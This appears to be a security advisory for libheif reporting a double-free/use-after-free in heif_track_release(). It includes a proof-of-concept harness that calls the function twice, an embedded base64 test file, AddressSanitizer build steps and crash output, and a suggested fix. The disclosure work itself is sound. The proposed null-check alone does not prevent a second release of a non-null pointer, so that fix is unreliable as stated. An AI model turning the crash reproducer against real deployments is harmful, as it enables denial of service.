# Double-free / heap-use-after-free in `heif_track_release()`

**Affected versions:** libheif ≤ 1.21.2, master `f20a88baec0f34825cc076b3dfb2578fb2d5728c`  
**CWE:** CWE-415 (Double Free), CWE-416 (Use After Free)  
**CVSS 3.1:** 6.1 Medium (AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H)  
**Trigger:** call `heif_track_release()` twice on the same pointer

---

## Root Cause

`heif_track_release()` (`heif_sequences.cc:55–58`) is a bare `delete` with no guard:

```cpp
// heif_sequences.cc:55-58
void heif_track_release(heif_track* track)
{
    delete track;   // no nullptr check, no double-free guard
}
```

`heif_track` holds a `std::shared_ptr<HeifContext>` (api_structs.h:41). The first `delete` runs the shared_ptr destructor normally (reference-count decrement on the control block). The heap region is then freed and poisoned. The second `delete` runs the destructor again — reading the freed control block — yielding ASAN `heap-use-after-free READ of size 8`.


## Proof of Concept

### 1. Decode the HEIF sequence file

Save the following as `decode_heif.py` and run `python3 decode_heif.py`:

```python
import base64
data = "AAAAHWZ0eXBtc2YxAAAAAG1zZjFoZWljc21pZjEAAAHlbW9vdgAAAGxtdmhkAAAAAAAAAAAAAAAAAAAD6AAAAAAAAQAAAQAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAXF0cmFrAAAAYHRraGQAAAADAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAABCW1kaWEAAAAgbWRoZAAAAAAAAAAAAAAAAAAAA+gAAAAAVcQAAAAAACFoZGxyAAAAAAAAAABtZXRhAAAAAAAAAAAAAAAAAAAAAMBtaW5mAAAADG5taGQAAAABAAAAJGRpbmYAAAAcZHJlZgAAAAAAAAABAAAADHVybCAAAAABAAAAiHN0YmwAAAAgc3RzZAAAAAAAAAABAAAAEHVyaW0AAAAAAAAAAQAAABhzdHRzAAAAAAAAAAEAAAABAAAAAQAAABxzdHNjAAAAAAAAAAEAAAABAAAAAQAAAAEAAAAYc3RzegAAAAAAAAAAAAAAAQAAAAEAAAAUc3RjbwAAAAAAAAABAAACCgAAAAltZGF0AA=="
open("minimal_sequence.heif", "wb").write(base64.b64decode(data))
print(f"Wrote {len(base64.b64decode(data))} bytes to minimal_sequence.heif")
```

### 2. Build libheif with AddressSanitizer

```bash
git clone --depth=1 https://github.com/strukturag/libheif.git /tmp/libheif
cmake -S /tmp/libheif -B /tmp/lhbuild \
    -DCMAKE_BUILD_TYPE=Debug \
    -DCMAKE_C_COMPILER=clang -DCMAKE_CXX_COMPILER=clang++ \
    -DCMAKE_C_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1" \
    -DCMAKE_CXX_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1" \
    -DCMAKE_INSTALL_PREFIX=/tmp/lhinstall \
    -DWITH_LIBDE265=OFF -DWITH_X265=OFF -DWITH_EXAMPLES=OFF
cmake --build /tmp/lhbuild -j$(nproc) --target install
```

### 3. Build and run the harness

Save as `poc_trigger.cc`:

```cpp
#include <cstdio>
#include <cstdlib>
#include <libheif/heif.h>
#include <libheif/heif_sequences.h>

int main(int argc, char* argv[]) {
    const char* path = argc > 1 ? argv[1] : "minimal_sequence.heif";
    FILE* f = fopen(path, "rb");
    fseek(f, 0, SEEK_END); long sz = ftell(f); rewind(f);
    unsigned char* data = (unsigned char*)malloc(sz);
    fread(data, 1, sz, f); fclose(f);

    heif_context* ctx = heif_context_alloc();
    heif_context_read_from_memory_without_copy(ctx, data, sz, nullptr);

    uint32_t track_ids[1] = {};
    heif_context_get_track_ids(ctx, track_ids);
    heif_track* track = heif_context_get_track(ctx, track_ids[0]);

    heif_track_release(track);  // first release — OK
    heif_track_release(track);  // second release — heap-use-after-free

    fprintf(stderr, "UNEXPECTED: no crash\n");
    heif_context_free(ctx); free(data);
}
```

```bash
clang++ -fsanitize=address -fno-omit-frame-pointer -g -O1 \
    poc_trigger.cc \
    -I/tmp/lhinstall/include -L/tmp/lhinstall/lib -Wl,-rpath,/tmp/lhinstall/lib \
    -lheif -o poc_trigger

ASAN_OPTIONS="detect_leaks=0:print_stacktrace=1" ./poc_trigger minimal_sequence.heif
```

### 4. Expected output

```
ERROR: AddressSanitizer: heap-use-after-free on address 0x7be2a99e0808
READ of size 8 at 0x7be2a99e0808 thread T0
    #0  std::__shared_count<...>::~__shared_count()
            shared_ptr_base.h:729
    #1  std::__shared_ptr<HeifContext,...>::~__shared_ptr()
            shared_ptr_base.h:1169
    #2  heif_track::~heif_track()
            api_structs.h:41
    #3  heif_track_release
            libheif/api/libheif/heif_sequences.cc:57
    #4  main  poc_trigger.cc

freed by thread T0 here:
    #0  operator delete(void*, unsigned long)
    #1  main  poc_trigger.cc    <-- first heif_track_release()

SUMMARY: AddressSanitizer: heap-use-after-free api_structs.h:41
    in heif_track::~heif_track()
```

## Suggested Fix

Add a null-check inside `heif_track_release()` and document that callers must null their pointer after release:

```cpp
// heif_sequences.cc
void heif_track_release(heif_track* track)
{
    if (track == nullptr) return;  // tolerate null and already-nulled pointers
    delete track;
}
```

Callers should also follow the pattern:
```c
heif_track_release(track);
track = NULL;  // prevent accidental double-release
```

Long-term, wrapping `heif_track*` in a reference-counted opaque handle would make double-release safe by design.
